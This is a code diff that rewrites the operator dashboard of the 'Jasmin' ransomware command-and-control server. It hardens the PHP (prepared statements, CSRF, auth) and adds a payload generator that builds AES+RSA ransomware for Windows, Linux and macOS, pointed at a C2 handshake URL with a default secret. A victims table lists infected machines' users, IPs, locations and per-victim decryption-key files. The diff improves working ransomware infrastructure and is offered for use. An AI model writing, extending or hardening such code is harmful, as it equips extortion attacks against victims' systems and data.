@@ -1,279 +1,152 @@
-<!DOCTYPE html>
 <?php
+require_once __DIR__ . '/includes/auth.php';
+require_once __DIR__ . '/includes/csrf.php';
+require_auth();
+include __DIR__ . '/database/db_conection.php';
 
-session_start();
-if( !isset($_SESSION['username']) ){
-	header("Location: login.php");
+$records_per_page = 10;
+$pageno = max(1, intval($_GET['pageno'] ?? 1));
+$search = trim($_GET['search'] ?? '');
+$offset = ($pageno - 1) * $records_per_page;
+
+if ($search !== '') {
+    $like = '%' . $search . '%';
+    $count_stmt = $pdo->prepare('SELECT COUNT(*) FROM victims WHERE machine_name LIKE :s1 OR computer_user LIKE :s2 OR os LIKE :s3 OR ip LIKE :s4 OR location LIKE :s5 OR systemid LIKE :s6');
+    $count_stmt->execute([':s1'=>$like,':s2'=>$like,':s3'=>$like,':s4'=>$like,':s5'=>$like,':s6'=>$like]);
+    $total_rows = (int)$count_stmt->fetchColumn();
+    $data_stmt = $pdo->prepare('SELECT * FROM victims WHERE machine_name LIKE :s1 OR computer_user LIKE :s2 OR os LIKE :s3 OR ip LIKE :s4 OR location LIKE :s5 OR systemid LIKE :s6 ORDER BY id DESC LIMIT :offset, :limit');
+    $data_stmt->bindValue(':s1',$like);$data_stmt->bindValue(':s2',$like);$data_stmt->bindValue(':s3',$like);
+    $data_stmt->bindValue(':s4',$like);$data_stmt->bindValue(':s5',$like);$data_stmt->bindValue(':s6',$like);
+    $data_stmt->bindValue(':offset',$offset,PDO::PARAM_INT);$data_stmt->bindValue(':limit',$records_per_page,PDO::PARAM_INT);
+    $data_stmt->execute();
+} else {
+    $total_rows = (int)$pdo->query('SELECT COUNT(*) FROM victims')->fetchColumn();
+    $data_stmt = $pdo->prepare('SELECT * FROM victims ORDER BY id DESC LIMIT :offset, :limit');
+    $data_stmt->bindValue(':offset',$offset,PDO::PARAM_INT);$data_stmt->bindValue(':limit',$records_per_page,PDO::PARAM_INT);
+    $data_stmt->execute();
 }
+$total_pages = max(1,(int)ceil($total_rows/$records_per_page));
+if ($pageno > $total_pages) $pageno = $total_pages;
+$rows = $data_stmt->fetchAll();
+function h(string $s): string { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
+$csrf = csrf_token();
 ?>
-<html lang="en" >
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Jasmin Dashboard</title>
-  <link rel="stylesheet" href="./assets/css/style2.css">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-  
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Jasmin C2</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<link rel="stylesheet" href="./assets/css/dashboard.css">
 </head>
 <body>
-<!-- partial:index.partial.html -->
-<h1><div class="flux">Jasmin Ransomware</div></h1>
-<h2>Coded with Heart &#10084;&#65039 by  &#8594; <a href="http://github.com/codesiddhant/jasmin" target="_blank" class="yellow" > S i d d h a n t  _   G o u r</a></h2>
-<h1><span class="yellow1">-Infected Systems Database-</span></h1>
+<nav class="sidebar" id="sidebar">
+  <div class="sidebar-head"><i class="fas fa-skull-crossbones"></i><span>JASMIN</span></div>
+  <a href="dashboard.php" class="nav-item active"><i class="fas fa-chart-pie"></i><span>Dashboard</span></a>
+  <a href="#gen" class="nav-item" onclick="showTab('gen')"><i class="fas fa-virus"></i><span>Payload Gen</span></a>
+  <a href="#victims" class="nav-item" onclick="showTab('victims')"><i class="fas fa-desktop"></i><span>Victims</span></a>
+  <div class="sidebar-foot">
+    <span class="user-badge"><i class="fas fa-user-shield"></i> <?=h($_SESSION['username'])?></span>
+    <a href="logout.php"><i class="fas fa-sign-out-alt"></i> Logout</a>
+  </div>
+</nav>
+<button class="hamburger" id="ham" onclick="document.getElementById('sidebar').classList.toggle('open')"><i class="fas fa-bars"></i></button>
 
-<div class="wrap">
-<form action="dashboard.php" method="get">
-   <div class="search" class="container">
-      <input required type="text" class="searchTerm" name="search" placeholder= "You Can Search Here i.e  &#34; systemid &#34; ">
-	  <input type="hidden" name="pageno" value="1">
-      <button type="submit" class="searchButton">
-        <i class="fa fa-search"></i>
-     </button>
-   </div>
+<main class="content">
+<!-- Stats -->
+<section class="stats-row">
+  <div class="stat-card red"><div class="stat-icon"><i class="fas fa-desktop"></i></div><div><span class="stat-num"><?=$total_rows?></span><label>Infected</label></div></div>
+  <div class="stat-card blue"><div class="stat-icon"><i class="fas fa-globe"></i></div><div><span class="stat-num"><?=$total_pages?></span><label>Pages</label></div></div>
+  <div class="stat-card green"><div class="stat-icon"><i class="fas fa-virus"></i></div><div><span class="stat-num">3</span><label>Platforms</label></div></div>
+</section>
+
+<!-- Payload Generator -->
+<section class="panel" id="panel-gen">
+<h2><i class="fas fa-virus"></i> Payload Generator</h2>
+<div class="gen-grid">
+  <div class="gen-card" data-platform="win">
+    <i class="fab fa-windows"></i><h3>Windows</h3><p>C# / .NET — AES+RSA</p>
+    <button class="btn btn-red" onclick="genPayload('win')"><i class="fas fa-download"></i> Generate</button>
+  </div>
+  <div class="gen-card" data-platform="linux">
+    <i class="fab fa-linux"></i><h3>Linux</h3><p>Python3 — AES+RSA</p>
+    <button class="btn btn-red" onclick="genPayload('linux')"><i class="fas fa-download"></i> Generate</button>
+  </div>
+  <div class="gen-card" data-platform="macos">
+    <i class="fab fa-apple"></i><h3>macOS</h3><p>Python3 — AES+RSA</p>
+    <button class="btn btn-red" onclick="genPayload('macos')"><i class="fas fa-download"></i> Generate</button>
+  </div>
 </div>
+<div class="gen-opts">
+  <div class="field"><label>C2 URL</label><input type="text" id="c2url" value="<?=h($GLOBALS['_ENV']['DB_HOST'] ?? 'http://127.0.0.1')?>/handshake.php" placeholder="http://yourserver/handshake.php"></div>
+  <div class="field"><label>Handshake Secret</label><input type="text" id="gensecret" value="jasmin@123"></div>
+</div>
+<div id="gen-result" class="gen-result"></div>
+</section>
 
-
+<!-- Victims -->
+<section class="panel" id="panel-victims">
+<h2><i class="fas fa-desktop"></i> Victims</h2>
+<form action="dashboard.php" method="get" class="search-form">
+  <input type="text" name="search" placeholder="Search name, IP, OS, location..." value="<?=h($search)?>">
+  <button type="submit"><i class="fas fa-search"></i></button>
 </form>
-
- <table class='container' id='myTable'>
-	<thead>
-		<tr>
-			<th><h1>Machine Name</h1></th>
-			<th><h1>Username</h1></th>
-			<th><h1>IP Address</h1></th>
-			<th><h1>Date</h1></th>
-			<th><h1>Time</h1></th>
-			<th><h1>Location</h1></th>
-			<th><h1>os</h1></th>
-			<th><h1>Decryption key</h1></th>
-		</tr>
-</thead>
-
-
-
-
-	<?php
-        include("database/db_conection.php");
-		$total_pages;
-		if(isset($_GET['search']) && isset($_GET['pageno']) )
-{
-        if (isset($_GET['pageno'])) {
-            $pageno = $_GET['pageno'];
-        } else 
-		{
-			
-            $pageno = 1;
-        }
-		$search=$_GET['search'];
-		
-        $records_per_page = 6;
-        $offset = ($pageno - 1) * $records_per_page;
-		$total_pages_sql = "select count(*) from victims where (machine_name like '%$search%') OR (computer_user like '%$search%') OR (os like'%$search%') OR (ip like '%$search%') OR (location like '%$search%') OR (systemid like '%$search%')";
-		$result = mysqli_query($dbcon,$total_pages_sql);
-        $total_rows = mysqli_fetch_array($result)[0];
-        $total_pages = ceil($total_rows / $records_per_page);
-		if( $total_rows == 0 || $search == null || $pageno > $total_pages)
-		{
-			header("Location: ./assets/other/notfound.php");
-		}
-		
-        $query="select * from victims where (machine_name like '$%search%') OR (computer_user like '%$search%') OR (os like'%$search%') OR (ip like '%$search%') OR (location like '%$search%') OR (systemid like '%$search%') LIMIT $offset, $records_per_page ";//select query for viewing users.
-        $run=mysqli_query($dbcon, $query);//here run the sql query.
-  while($row=mysqli_fetch_array($run))//while look to fetch the result and store in a array $row.
-        {
-            $machine_name=$row[1];
-            $computer_user=$row[2];
-			$os = $row[3];
-            $date=$row[4];
-            $time=$row[5];
-			$ip=$row[6];
-			$location=$row[7];
-			$systemid=$row[8];
-			                     
-    //Logic to Retrive Correect Password File.
-	$newtime = date("H-i-s", strtotime($time));  
-	$password_folder_name = $machine_name. '_' .$computer_user;
-	$password_file_name =  $newtime. '_' .$systemid;
-	$password_file_extension = $password_file_name. "." ."flora";
-	$file ='passwords/';
-	$file .= $password_folder_name. '/' .$password_file_extension;
-	
+<div class="table-wrap"><table>
+<thead><tr><th>#</th><th>Machine</th><th>User</th><th>OS</th><th>IP</th><th>Location</th><th>Date</th><th>Time</th><th>Key</th></tr></thead>
+<tbody>
+<?php if(empty($rows)):?>
+<tr><td colspan="9" class="empty">No victims found.</td></tr>
+<?php else: foreach($rows as $i=>$row):
+  $sm=preg_replace('/[^a-zA-Z0-9_\-]/','_',$row['machine_name']);
+  $su=preg_replace('/[^a-zA-Z0-9_\-]/','_',$row['computer_user']);
+  $ss=preg_replace('/[^a-zA-Z0-9_\-]/','_',$row['systemid']);
+  $nt=date("H-i-s",strtotime($row['time']));
+  $fp='passwords/'.$sm.'_'.$su.'/'.$nt.'_'.$ss.'.flora';
 ?>
-	<tbody>
-		<tr>
-		    <td><?php echo $machine_name;?></td>
-            <td><?php echo $computer_user;  ?></td>
-            <td><?php echo $ip;  ?></td>
-            <td><?php echo $date;  ?></td>
-			<td><?php echo $time;  ?></td>
-			<td><?php echo $location;  ?></td>
-			<td><?php echo $os;  ?></td>
-			<td><a href="download_file.php?file=<?php echo $file ?>"> <button class="btn"><i class="fa fa-download"></i> Download</button></a></td>
-        </tr>
-		</tbody> 
-		
-		<?php }
-  
+<tr>
+  <td><?=$offset+$i+1?></td><td><?=h($row['machine_name'])?></td>
+  <td><?=h($row['computer_user'])?></td><td><span class="os-badge"><?=h($row['os'])?></span></td>
+  <td><?=h($row['ip'])?></td><td><?=h($row['location'])?></td>
+  <td><?=h($row['date'])?></td><td><?=h($row['time'])?></td>
+  <td><?php if(file_exists($fp)):?><a href="download_file.php?file=<?=urlencode($fp)?>" class="btn-sm"><i class="fas fa-key"></i></a><?php else:?><span class="muted">—</span><?php endif;?></td>
+</tr>
+<?php endforeach;endif;?>
+</tbody></table></div>
+<?php if($total_pages>1):?>
+<nav class="pagination">
+  <a href="?search=<?=urlencode($search)?>&pageno=1" <?=$pageno<=1?'class="disabled"':''?>>&laquo;</a>
+  <a href="?search=<?=urlencode($search)?>&pageno=<?=max(1,$pageno-1)?>" <?=$pageno<=1?'class="disabled"':''?>>&lsaquo;</a>
+  <?php $s2=max(1,$pageno-3);$e2=min($total_pages,$pageno+3);for($p=$s2;$p<=$e2;$p++):?>
+  <a href="?search=<?=urlencode($search)?>&pageno=<?=$p?>" <?=$p===$pageno?'class="active"':''?>><?=$p?></a>
+  <?php endfor;?>
+  <a href="?search=<?=urlencode($search)?>&pageno=<?=min($total_pages,$pageno+1)?>" <?=$pageno>=$total_pages?'class="disabled"':''?>>&rsaquo;</a>
+  <a href="?search=<?=urlencode($search)?>&pageno=<?=$total_pages?>" <?=$pageno>=$total_pages?'class="disabled"':''?>>&raquo;</a>
+</nav>
+<?php endif;?>
+</section>
+</main>
+
+<script>
+function showTab(t){
+  document.querySelectorAll('.panel').forEach(p=>p.style.display='none');
+  var el=document.getElementById('panel-'+t);if(el)el.style.display='block';
+  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
+  event.target.closest('.nav-item').classList.add('active');
 }
-else
-{ 	
-        if (isset($_GET['pageno'])) {
-            $pageno = $_GET['pageno'];
-        } else {
-            $pageno = 1;
-        }
-        $records_per_page = 6;
-        $offset = ($pageno-1) * $records_per_page;
-		$total_pages_sql = "select count(*) from victims";
-        $result = mysqli_query($dbcon,$total_pages_sql);
-        $total_rows = mysqli_fetch_array($result)[0];
-        $total_pages = ceil($total_rows / $records_per_page);
-		if($pageno > $total_pages)
-		{	
-		header("Location: ./assets/other/notfound.php");
-		}
-	
-		$query = "select * from victims ORDER BY `id` DESC LIMIT $offset, $records_per_page ";//select query for viewing users.
-        $run = mysqli_query($dbcon,$query);
-		while($row = mysqli_fetch_array($run)){
-            //here goes the data
-            $machine_name=$row[1];
-            $computer_user=$row[2];
-			$os = $row[3];
-            $date=$row[4];
-            $time=$row[5];
-			$ip=$row[6];
-			$location=$row[7];
-			$systemid=$row[8];
-			                     
-    //Logic to Retrive Correect Password File.
-	$newtime = date("H-i-s", strtotime($time));  
-	$password_folder_name = $machine_name. '_' .$computer_user;
-	$password_file_name =  $newtime. '_' .$systemid;
-	$password_file_extension = $password_file_name. "." ."flora";
-	$file ='passwords/';
-	$file .= $password_folder_name. '/' .$password_file_extension;
-	
-?>
-	<tbody>
-		<tr>
-		    <td><?php echo $machine_name;?></td>
-            <td><?php echo $computer_user;  ?></td>
-            <td><?php echo $ip;  ?></td>
-            <td><?php echo $date;  ?></td>
-			<td><?php echo $time;  ?></td>
-			<td><?php echo $location;  ?></td>
-			<td><?php echo $os;  ?></td>
-			<td><a href="download_file.php?file=<?php echo $file ?>"> <button class="btn"><i class="fa fa-download"></i> Download</button></a></td>
-        </tr>
-		
-		</tbody> 
-		
-<?php }}
-
- ?>
-</table> 
-
-<ul>
-<?php
-$start=1; //staring number of button
-$max=10; //max number of button
-
-if(isset($_GET['search']) && isset($_GET['pageno']) ) //displaying only the search result
-{
-	if(isset($_GET['pageno']))
-	{
-		$pageno = $_GET['pageno'];
-	}
-	else
-	{
-      $pageno = 1;
-	}
-    $srch = "search=" .$_GET['search']. "&pageno";
+function genPayload(p){
+  var c2=document.getElementById('c2url').value;
+  var sec=document.getElementById('gensecret').value;
+  var res=document.getElementById('gen-result');
+  res.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> Generating '+p+' payload...</span>';
+  var fd=new FormData();
+  fd.append('platform',p);fd.append('c2_url',c2);fd.append('secret',sec);fd.append('csrf_token','<?=$csrf?>');
+  fetch('generate.php',{method:'POST',body:fd})
+  .then(r=>r.json()).then(d=>{
+    if(d.ok){
+      res.innerHTML='<div class="gen-ok"><i class="fas fa-check-circle"></i> <b>'+d.platform+'</b> payload ready: <a href="payloads/'+d.file+'" download>'+d.file+'</a> ('+d.size+' bytes)</div>';
+    }else{res.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';}
+  }).catch(e=>{res.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> Error: '+e+'</div>';});
 }
-	
-else //displaying all the victims
-{ 
-
-    if(isset($_GET['pageno']))
-	{
-		$pageno = $_GET['pageno'];
-	}
-	else
-	{
-      $pageno = 1;
-	}
-    $srch = "pageno";
-}   
-        
-
-//previous buttuon
-if($pageno > 1)
-{
-	$prev = $pageno - 1;
-}
-else
-{
-	$prev = 1;
-}
-echo "<li><a class='' href='?".$srch."=".$prev."'><</a></li>";
-
-
-//Pagination Algorithm
-   if ($pageno >= 10 && $pageno <= $total_pages )
-   {
-	   $start = $pageno - $max + 2;
-	   $max   = $pageno;
-   }
-   else if ( $pageno < $total_pages)
-   {
-	   $start=1;
-       $max=10;	     
-   }
-   else if ($pageno > $total_pages)
-   {
-	 $pageno = 1;
-	 $start=1;
-     $max=10;	
-   }
- 
-//priting page numbers in using for loop
-    for($x = $start;$x <= $max;$x++) 
-	{
-		
-		if($pageno == $x)
-		{
-			echo "<li><a class='active' href='?".$srch."=".$x."'>".$x."</a></li>";
-			$x++;
-		}
-		if ($x > $total_pages)
-		{
-			break;
-		}
-		echo "<li><a class='' href='?".$srch."=".$x."'>".$x."</a></li>";
-
-    }
-	//next button
-	$next = $pageno + 1 ;
-	echo "<li><a class='' href='?".$srch."=".$next."'>></a></li>";
-	
-	
-?>
-</ul>   
-<?php 
-if (isset($_GET['pageno']))
-{
-          
-      echo "<a href='dashboard.php'>  <button class='btn'><i class='fa fa-home' class='li'></i> back to home</button></a>" ;
-	  echo "<a href='logout.php'>     <button class='btn'><i class='fa fa-sign-out'></i> &#160; Log Out &#160; &#160;</button></a>";
-}
-else
-{
-	  echo "<a href='dashboard.php'>  <button class='btn'><i class='fa fa-refresh' class='li'></i> &#160; Reload &#160;</button></a>" ;
-	  echo "<a href='logout.php'>     <button class='btn'> <i class='fa fa-sign-out' class='li'> </i> &#160; &#160; Logout &#160;</button></a>";
-}
-?>
-
-<p style="font-size:  80%;  padding-top: 15px; " >   © codesiddhant </p> 
-	
+</script>
 </body>
-</html> 
+</html>
